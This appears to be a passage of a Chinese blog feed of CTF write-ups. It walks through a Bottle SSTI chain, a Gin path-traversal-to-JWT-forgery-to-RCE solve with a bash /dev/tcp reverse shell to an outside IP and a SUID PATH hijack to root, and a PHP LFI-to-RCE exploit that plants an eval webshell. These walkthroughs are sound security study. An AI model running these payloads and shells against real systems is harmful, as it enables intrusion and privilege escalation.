class="hljs-string">f&#x27;\r[*]result: <span class="hljs-subst">&#123;result&#125;</span>&#x27;</span>)<br><br><br><br></code></pre></td></tr></table></figure><h1 id="学生姓名登记系统"><a href="#学生姓名登记系统" class="headerlink" title="学生姓名登记系统"></a><strong>学生姓名登记系统</strong></h1><p>写了一下这个题目，起初以为只是简单的ssti，但是发下是bottle模板，而且还限制了长度</p><p>题目提示要多行，刚开始想的是<code>&#123;%set%&#125;</code>,不知道是botlle模板，不知道没有这个</p><p><a href="https://www.osgeo.cn/bottle/stpl.html">bottle开发文档</a></p><p>有一个新的知识 <code>:=</code>点再python3.8以后就有了这个运算符</p><p> Bottle 的模板引擎依赖于 Python 的表达式求值，但它并不是一个完整的 Python 解释器。在模板中，只有可直接求值的表达式才能通过 <code>&#123;&#123;...&#125;&#125;</code> 语法嵌入。因此，<code>a=5</code> 这样的赋值语法会导致语法错误，因为赋值本身并不是一个返回值的表达式，而是一个操作</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a:</span>=<span class="hljs-number">5</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215171504250.png" alt="image-20250215171504250"></p><p>那么就可以写了</p><p>payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a:</span>=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">b:</span>=a.__class__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">c:</span>=b.__base__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">d:</span>=c.__subclasses__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">e:</span>=d()[156]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">f:</span>=e.__init__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g:</span>=f.__globals__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">z:</span>=<span class="hljs-string">&#x27;__builtins__&#x27;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">h:</span>=g[z]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">i:</span>=h[&#x27;op&#x27;&#x27;en&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x:</span>=i(<span class="hljs-name">&quot;/flag&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">y:</span>=x.read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215171805552.png" alt="image-20250215171805552"></p><h1 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h1><p>先看源码，发现再download路由存在目录穿越，没对输入进行处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">func Download(c *gin.Context) &#123;<br>filename := c.DefaultQuery(<span class="hljs-string">&quot;filename&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> filename == <span class="hljs-string">&quot;&quot;</span> &#123;<br>response.Response(c, http.StatusBadRequest, <span class="hljs-number">400</span>, nil, <span class="hljs-string">&quot;Filename is required&quot;</span>)<br>&#125;<br>basepath := <span class="hljs-string">&quot;./uploads&quot;</span><br>filepath, _ := url.JoinPath(basepath, filename)<br><span class="hljs-keyword">if</span> _, err := os.Stat(filepath); os.IsNotExist(err) &#123;<br>response.Response(c, http.StatusBadRequest, <span class="hljs-number">404</span>, nil, <span class="hljs-string">&quot;File not found&quot;</span>)<br>&#125;<br>c.Header(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=&quot;</span>+filename)<br>c.File(filepath)<br>&#125;<br></code></pre></td></tr></table></figure><p>那我们传<code>filename=../config/key.go</code>拿到key的一部分</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> config<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Key</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;r00t32l&quot;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Year</span><span class="hljs-params">()</span></span> <span class="hljs-type">int64</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">2025</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在看他的key的生成逻辑</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateKey</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br>rand.Seed(config.Year())<br>randomNumber := rand.Intn(<span class="hljs-number">1000</span>)<br>key := fmt.Sprintf(<span class="hljs-string">&quot;%03d%s&quot;</span>, randomNumber, config.Key())<br><span class="hljs-keyword">return</span> key<br>&#125;<br></code></pre></td></tr></table></figure><p>那我们就可以生成key</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215172821196.png" alt="image-20250215172821196"></p><p>拿到key那就可以进行jwt伪造生成admin的token</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiIsInR<span class="hljs-number">5</span>cCI<span class="hljs-number">6</span>IkpXVCJ<span class="hljs-number">9</span>.eyJ<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>ImFkbWluIiwiaXNzIjoiTWFzaDFyMCIsInN<span class="hljs-number">1</span>YiI<span class="hljs-number">6</span>InVzZXIgdG<span class="hljs-number">9</span>rZW<span class="hljs-number">4</span>iLCJleHAiOjE<span class="hljs-number">3</span>Mzk<span class="hljs-number">2</span>OTc<span class="hljs-number">3</span>NjQsImlhdCI<span class="hljs-number">6</span>MTczOTYxMTM<span class="hljs-number">2</span>NH<span class="hljs-number">0</span>.ARUWYZnXAJTR<span class="hljs-number">0</span>QmR-Vn<span class="hljs-number">4e49</span>HEPI<span class="hljs-number">1</span>o<span class="hljs-number">4</span>CpSvrxP<span class="hljs-number">3</span>NBVgM<br></code></pre></td></tr></table></figure><p>那我们就可以进行rce了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">containsBannedPackages</span><span class="hljs-params">(code <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>    importRegex := <span class="hljs-string">`(?i)import\s*\((?s:.*?)\)`</span><br>    re := regexp.MustCompile(importRegex)<br>    matches := re.FindStringSubmatch(code)<br>    imports := matches[<span class="hljs-number">0</span>]<br>    log.Println(imports)<br>    <span class="hljs-keyword">if</span> strings.Contains(imports, <span class="hljs-string">&quot;os/exec&quot;</span>) &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>不让os&#x2F;exec，我们用syscall</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;syscall&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    syscall.Exec(<span class="hljs-string">&quot;/bin/sh&quot;</span>, []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>&#125;, []<span class="hljs-type">string</span>&#123;&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">bash -c &quot;bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">8.138.181.58</span>/<span class="hljs-number">32771 0</span>&gt;&amp;<span class="hljs-number">1</span>&quot;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215174943757.png" alt="image-20250215174943757"></p><p>假的，看看有没有suid提权</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/usr/bin/chsh<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/su</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/passwd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/newgrp</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/mount</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/gpasswd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/umount</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chfn</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/sudo</span><br><span class="hljs-regexp">/.../</span>Cat<br></code></pre></td></tr></table></figure><p>有个&#x2F;…&#x2F;Cat运行时，其实是运行了<code>system(&#39;cat /flag&#39;)</code>那我们尝试环境变量劫持cat命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash\n/bin/bash&#x27;</span> &gt; /tmp/cat<br><span class="hljs-built_in">chmod</span> +x /tmp/cat <br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br>/.../Cat<br></code></pre></td></tr></table></figure><p>发现我们的权限变成root</p><p>再拿flag，不能用cat了</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215175852729.png" alt="image-20250215175852729"></p>]]></content>
    
    
    <categories>
      
      <category>比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlite注入</tag>
      
      <tag>linux提权</tag>
      
      <tag>时间盲注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>n1ctf</title>
    <link href="/tuyi/2025/02/09/n1ctf/"/>
    <url>/tuyi/2025/02/09/n1ctf/</url>
    
    <content type="html"><![CDATA[<h1 id="n1ctf"><a href="#n1ctf" class="headerlink" title="n1ctf"></a>n1ctf</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>n1战队的招新赛，题目都非常有深度，平时的知识点但是很深入，写之前还抱有一丝进入战队的幻想，拼尽全力无法战胜</p><p>全是大佬</p><p><strong>写出4题其中<code>Easydb</code>是在<code>23：08</code>写出提交</strong></p><h2 id="Gavatar"><a href="#Gavatar" class="headerlink" title="Gavatar"></a>Gavatar</h2><p>写了很久，一直以为是上传文件，有任意文件读取，但是那个权限实在没法绕</p><p>后面突然想起这是LFI那是不是可以利用去年那个cve，结果就成了 ^_^</p><p><a href="https://xz.aliyun.com/news/14127">LFI到RCE</a>感谢<a href="https://blog.kengwang.com.cn/archives/640/?replyTo=535">kengwang</a>师傅让我了解</p><p>现在分析一下我的思路</p><p>分析源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php">upload.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;common.php&#x27;</span>;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">getCurrentUser</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$user</span>) <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br><br><span class="hljs-variable">$avatarDir</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/avatars&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$avatarDir</span>)) <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$avatarDir</span>, <span class="hljs-number">0755</span>);<br><br><span class="hljs-variable">$avatarPath</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$avatarDir</span>/<span class="hljs-subst">&#123;$user[&#x27;id&#x27;]&#125;</span>&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$finfo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">finfo</span>(FILEINFO_MIME_TYPE);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$finfo</span>-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]), [<span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/gif&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type&#x27;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$avatarPath</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$image</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$image</span> === <span class="hljs-literal">false</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid URL&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$avatarPath</span>, <span class="hljs-variable">$image</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>首先看到一个文件上传，一个<code>file_get_contents</code>函数</p><p>文件上传那块测了很久，结果mime类型一直错，倒是<code>file_get_contents</code>可以任意文件读取</p><p>拿到了一些东西</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;users&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3522418a-e150-41b3-9a7d-ac41d3f4576a&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$2y$10$TJqRZATYatGq16hhzgFNye.mJ83nblneeHXFFIArCsInETF1l2IXy&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>但是没啥用，卡了几个小时</p><p><strong>正确方法：</strong></p><p>LFI to RCE</p><p><a href="https://www.cnblogs.com/ddd-flag">具体原理参考</a></p><p><a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">脚本地址</a></p><p>把Romote类改成这样—-注意用户名和cookie替换成自己的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.url = url<br>        <span class="hljs-variable language_">self</span>.session = Session()<br>        <span class="hljs-variable language_">self</span>.session.headers = &#123;<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span>,<br>            <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=3b3e88b173b7a66ef0d737c1d6dd92b6&quot;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        files = &#123;<br>        <span class="hljs-string">&quot;avatar&quot;</span>: (<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">b&quot;&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>),  <span class="hljs-comment"># 空文件</span><br>        <span class="hljs-string">&quot;url&quot;</span>: (<span class="hljs-literal">None</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>),  <span class="hljs-comment"># 普通字段</span><br>        &#125;<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;url:  <span class="hljs-subst">&#123;self.url&#125;</span>&quot;</span>)<br>        req1=<span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/upload.php&quot;</span>, files=files)<br>        req2=<span class="hljs-variable language_">self</span>.session.get(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/avatar.php?user=admin&quot;</span>)<br>        <span class="hljs-keyword">return</span> req2<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mysend</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        req=<span class="hljs-variable language_">self</span>.session.get(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/avatar.php?user=admin&quot;</span>)<br>        <span class="hljs-keyword">return</span> req<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        response = <span class="hljs-variable language_">self</span>.send(path)<br>        data = response.re.search(<span class="hljs-string">b&quot;(.*)&quot;</span>, flags=re.S).group(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> base64.decode(data)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure><p>运行poc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exp.py http://39.106.16.204:12626/ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?=@eval(\$_POST[0]);?&gt;&#x27;</span> &gt; 1.php<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>然后访问1.php POST传参</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209224407146.png" alt="image-20250209224407146"></p><h2 id="traefik"><a href="#traefik" class="headerlink" title="traefik"></a>traefik</h2><p>源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;archive/zip&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;path/filepath&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/google/uuid&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> uploadDir = <span class="hljs-string">&quot;./uploads&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unzipSimpleFile</span><span class="hljs-params">(file *zip.File, filePath <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>outFile, err := os.Create(filePath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> outFile.Close()<br><br>fileInArchive, err := file.Open()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> fileInArchive.Close()<br><br>_, err = io.Copy(outFile, fileInArchive)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span 